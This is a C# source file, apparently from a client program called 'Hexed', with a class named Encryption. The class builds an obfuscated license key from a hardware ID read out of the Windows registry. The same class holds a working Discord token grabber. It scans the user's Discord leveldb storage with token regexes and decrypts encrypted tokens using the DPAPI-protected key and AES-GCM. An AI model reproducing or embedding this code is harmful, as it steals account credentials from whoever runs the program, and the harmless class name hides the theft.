using Microsoft.Win32;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Hexed.Core
{
    internal class Encryption
    {
        public static string FromBase64(string Data)
        {
            var base64EncodedBytes = Convert.FromBase64String(Data);
            return Encoding.UTF8.GetString(base64EncodedBytes);
        }

        public static string ToBase64(string Data)
        {
            var plainTextBytes = Encoding.UTF8.GetBytes(Data);
            return Convert.ToBase64String(plainTextBytes);
        }

        public static string EncryptAuthKey(string Key, string Timestamp, string ValidationType, string HWID)
        {
            string EncryptedKey = ValidationType;
            EncryptedKey += ":";
            EncryptedKey += ToBase64(Timestamp);
            EncryptedKey += ":";
            EncryptedKey += ToBase64(HWID);
            EncryptedKey += ":";
            EncryptedKey += ToBase64(Key);
            EncryptedKey += "98NXvV3d";
            EncryptedKey += ToBase64("10792dC");

            return ToBase64(EncryptedKey);
        }

        public static string GetHWID()
        {
            string HWID = "";
            HWID += GetProductID();
            HWID += "0";
            HWID += Environment.ProcessorCount;
            HWID += "XI";
            HWID += GetMachineID();
            HWID += "v3";
            HWID += GetProfileGUID();
            HWID = ToBase64(HWID);
            HWID += "9OLM";
            return ToBase64(HWID);
        }

        private static string GetProductID()
        {
            RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
            string ProductID = registryKey.GetValue("ProductID").ToString();
            registryKey.Close();
            return ProductID;
        }

        private static string GetMachineID()
        {
            RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\SQMClient", false);
            string MachineID = registryKey.GetValue("MachineId").ToString();
            registryKey.Close();
            return MachineID;
        }

        private static string GetProfileGUID()
        {
            RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001", false);
            string ProfileGUID = registryKey.GetValue("HwProfileGUID").ToString();
            registryKey.Close();
            return ProfileGUID;
        }

        public static string GrabDiscord()
        {
            string Tokens = "";

            Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
            Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);

                Match match1 = BasicRegex.Match(contents);
                if (match1.Success) Tokens += match1.Value + "\n";

                Match match2 = NewRegex.Match(contents);
                if (match2.Success) Tokens += match2.Value + "\n";

                Match match3 = EncryptedRegex.Match(contents);
                if (match3.Success)
                {
                    string token = DecryptDiscordToken(Convert.FromBase64String(match3.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State");
                    Tokens += token + "\n";
                }
            }

            return Tokens;
        }

        private static byte[] GetDiscordKey(string path)
        {
            dynamic jsonKey = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)jsonKey.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        private static string DecryptDiscordToken(byte[] buffer, string path)
        {
            byte[] iv = buffer.Skip(3).Take(12).ToArray();
            byte[] encrypted = buffer.Skip(15).ToArray();
            var cipher = new GcmBlockCipher(new AesEngine());
            var parameters = new AeadParameters(new KeyParameter(GetDiscordKey(path)), 128, iv, null);
            cipher.Init(false, parameters);
            var decryptedBytes = new byte[cipher.GetOutputSize(encrypted.Length)];
            var retLen = cipher.ProcessBytes(encrypted, 0, encrypted.Length, decryptedBytes, 0);
            cipher.DoFinal(decryptedBytes, retLen);
            return Encoding.UTF8.GetString(decryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
    }
}
